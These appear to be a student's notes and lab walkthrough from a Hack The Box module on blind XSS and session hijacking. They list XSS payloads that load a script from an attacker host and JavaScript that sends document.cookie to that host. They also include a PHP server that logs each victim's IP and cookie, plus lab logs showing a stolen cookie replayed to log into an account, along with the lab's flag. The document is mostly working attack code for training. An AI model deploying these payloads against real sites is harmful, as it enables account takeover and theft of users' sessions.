# Session Hijacking

With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a Session Hijacking (aka Cookie Stealing) attack.

## Blind XSS Detection

Blind XSS : vulnerability is triggered on a page we don't have access to.

how would we be able to detect an XSS vulnerability if we cannot see how the output is handled?

--> use a JavaScript payload that sends an HTTP request back to our server.

How can we know which specific field is vulnerable? 
Since any of the fields may execute our code, we can't know which of them did.

How can we know what XSS payload to use? 
Since the page may be vulnerable, but the payload may not work?

## Loading a Remote Script

<script src="http://OUR_IP/script.js"></script>

If we inject the script into username field :
<script src="http://OUR_IP/username"></script>

--> To ensure username is the vulnerable field

Tip : Skip email and passwords fields because there is input validation on email and passwords are stored as hash

## Testing various payloads

<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>

## Session Hijacking

Once we find a working XSS payload and have identified the vulnerable input field :

Using a payload to send us a cookie : script.js on our VM

document.location='http://OUR_IP/index.php?c='+document.cookie;

OR

new Image().src='http://OUR_IP/index.php?c='+document.cookie;

Change the URL in previous XSS Payload 

<script src=http://OUR_IP/script.js></script>

We can save the following PHP script as index.php 

mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php

<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

sudo php -S 0.0.0.0:8081

cat cookies.txt 
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2

Finally, we can use this cookie on the login.php page to access the victim's account.

## LAB

http://10.129.143.89/hijacking

mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php

<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

sudo php -S 0.0.0.0:8081

<script src=http://10.10.15.46:8081/username></script>

--> failed

'><script src=http://10.10.15.46:8081/username></script>

--> failed

"><script src=http://10.10.15.46:8081/username></script>

--> failed

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.15.46:8081/username\';document.body.appendChild(a)')

--> failed

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.15.46:8081/username");a.send();</script>

--> failed

<script>$.getScript("http://10.10.15.46:8081/username")</script>

--> failed

<script src=http://10.10.15.46:8081/fullname></script>

--> failed

'><script src=http://10.10.15.46:8081/fullname></script>

--> failed

"><script src=http://10.10.15.46:8081/fullname></script>

--> failed

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.15.46:8081/fullname\';document.body.appendChild(a)')

--> failed

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.15.46:8081/fullname");a.send();</script>

--> failed

<script>$.getScript("http://10.10.15.46:8081/fullname")</script>

--> failed

<script src=http://10.10.15.46:8081/profilpicture></script>

--> failed

'><script src=http://10.10.15.46:8081/profilpicture></script>

--> failed

"><script src=http://10.10.15.46:8081/profilpicture></script>

[Thu Dec 28 11:38:37 2023] PHP 7.4.33 Development Server (http://0.0.0.0:8081) started
[Thu Dec 28 11:50:27 2023] 10.129.143.89:33042 Accepted
[Thu Dec 28 11:50:27 2023] 10.129.143.89:33042 [200]: GET /profilpicture
[Thu Dec 28 11:50:27 2023] 10.129.143.89:33042 Closing

On our web server :

vi script.js

new Image().src='http://10.10.15.46:8081/index.php?c='+document.cookie;

sudo php -S 0.0.0.0:8081


"><script src=http://10.10.15.46:8081/script.js></script>

[Thu Dec 28 11:53:12 2023] PHP 7.4.33 Development Server (http://0.0.0.0:8081) started
[Thu Dec 28 11:53:21 2023] 10.129.143.89:33124 Accepted
[Thu Dec 28 11:53:21 2023] 10.129.143.89:33124 [200]: (null) /script.js
[Thu Dec 28 11:53:21 2023] 10.129.143.89:33124 Closing
[Thu Dec 28 11:53:21 2023] 10.129.143.89:33126 Accepted
[Thu Dec 28 11:53:21 2023] 10.129.143.89:33126 [200]: GET /index.php?c=cookie=c00k1355h0u1d8353cu23d
[Thu Dec 28 11:53:21 2023] 10.129.143.89:33126 Closing

cat /tmp/tmpserver/cookies.txt
Victim IP: 10.129.143.89 | Cookie: cookie=c00k1355h0u1d8353cu23d

Firefox > Application >  Storage > Cookies

POST /hijacking/login.php HTTP/1.1
Host: 10.129.143.89
Content-Length: 27
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Origin: http://10.129.143.89
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.129.143.89/hijacking/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: cookie=c00k1355h0u1d8353cu23d
Connection: close

username=test&password=test


HTB{4lw4y5_53cur3_y0ur_c00k135}

